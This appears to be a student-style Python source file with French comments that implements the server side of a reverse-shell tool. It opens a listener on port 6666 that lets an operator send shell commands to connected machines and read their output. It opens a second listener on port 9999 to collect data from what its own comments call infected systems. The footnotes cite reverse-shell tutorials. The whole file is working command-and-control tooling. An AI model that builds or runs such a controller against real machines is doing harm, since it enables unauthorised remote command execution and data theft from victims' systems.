#!/usr/bin/env python
#coding=utf-8
__author__ = "Karl Boulais"

import socket
import threading
import os
import platform
import json

class Server():
    def __init__(self):
        self._host = "0.0.0.0"
        self.cSocket = []
        self.cAddr = []
        self._serverThreadList = [self._serverData, self._serverReverseShell]
        self.inSession = False


    def returnServerList(self):
        pass

    @staticmethod
    def _clrscr():
            if platform.system() == "Linux":
                os.system("clear")
            elif platform.system() == "Windows":
                os.system("cls")

    def _sending(self, c, data):
        return c.send(bytes(json.dumps(data), "UTF-8"))
         
    
    def _receiving(self, c):
        data = ""
        while True:
            try:
                data += c.recv(1024).decode("UTF-8").strip()
                return json.loads(data)
            except ValueError:
                continue

    def _systemData(self, c):
        data = {}
        quitting = False
        while not quitting:

            data = self._receiving(c)
            if data["message"] == "exit":
                c.close()
                quitting = True
            else:
                # print(data["message"])
                pass
                
            # TODO: Change print for DAO 

    def _reverseShell(self, c):

        quitting = False

        # Reçoit le premier message et initialise data["cwd"]
        data = self._receiving(c)
        while not quitting:

            data["command"] = input(f"{data['cwd']} $> ")
            if not data["command"].strip():
                continue
            elif data["command"].lower() == "cls" or data["command"].lower() == "clear":
                self._clrscr()
                continue
            else:
                self._sending(c, data)
                data = self._receiving(c)
            
            if data["command"].lower() == "exit":
                self.cSocket.pop(self.cSocket.index(c))
                quitting = True
                c.close()
                self.inSession = False
                continue
        
            print(data["output"])

    def _serverReverseShell(self, s):
        # Démarre le service pour recevoir les connexions ReverseShell
        c = None
        addr = None

        port = 6666

        s.bind((self._host, port))
        s.listen(5)

        while True:
            try:
                # Reçoit les connexions
                c, addr = s.accept()
                # Ajoute les connexions dans un dictionnaire | La clef = un objet socket -> valeur = un tuple (ip, port interne)
                # self.connectedServers[c] = addr
                self.cSocket.append(c)
                self.cAddr.append(addr)


                
                print('\nGot connection from', addr)

                # On crée un thread par connection
                # threading.Thread(target=self._ReverseShell, args=(c,)).start()
            except socket.timeout:
                continue
        
    def startReverseShellInstance(self, c):
        threading.Thread(target=self._reverseShell, args=(c,)).start()

    def _serverData(self, s):
        # Démarre le service pour recevoir les données des systèmes infectés

        c = None
        addr = None

        # On crée un objet socket
        # s = socket.socket()

        port = 9999
        s.bind((self._host, port))
        s.listen(5)

        while True:
            c, addr = s.accept()
            print('\nGot connection from', addr)

            # On crée un thread receiving data
            connection_handler = threading.Thread(
                target=self._systemData,
                args=(c,)
            )
            connection_handler.start()
            print(self.cSocket)
        

    def main(self):
        # Démarre deux threads pour recevoir les connexions: 1- ReverseShell 2- reception de données
        for server in self._serverThreadList:
            s = socket.socket()
            threading.Thread(target=server, args=(s,)).start()
            


if __name__ == "__main__":
   Server().main()















'''
.. rubric:: Notes de bas de page

.. [1]  https://www.tutorialspoint.com/python_network_programming/python_sockets_programming.htm 
        Principe de base d'une connexion TCP avec le module socket
.. [2]  https://gist.github.com/Integralist/3f004c3594bbf8431c15ed6db15809ae
        Utilisation de thread pour prendre en charge plusieurs connexions client à la fois
.. [3]  https://www.thepythoncode.com/article/create-reverse-shell-python
        Création d'un reverse shell

'''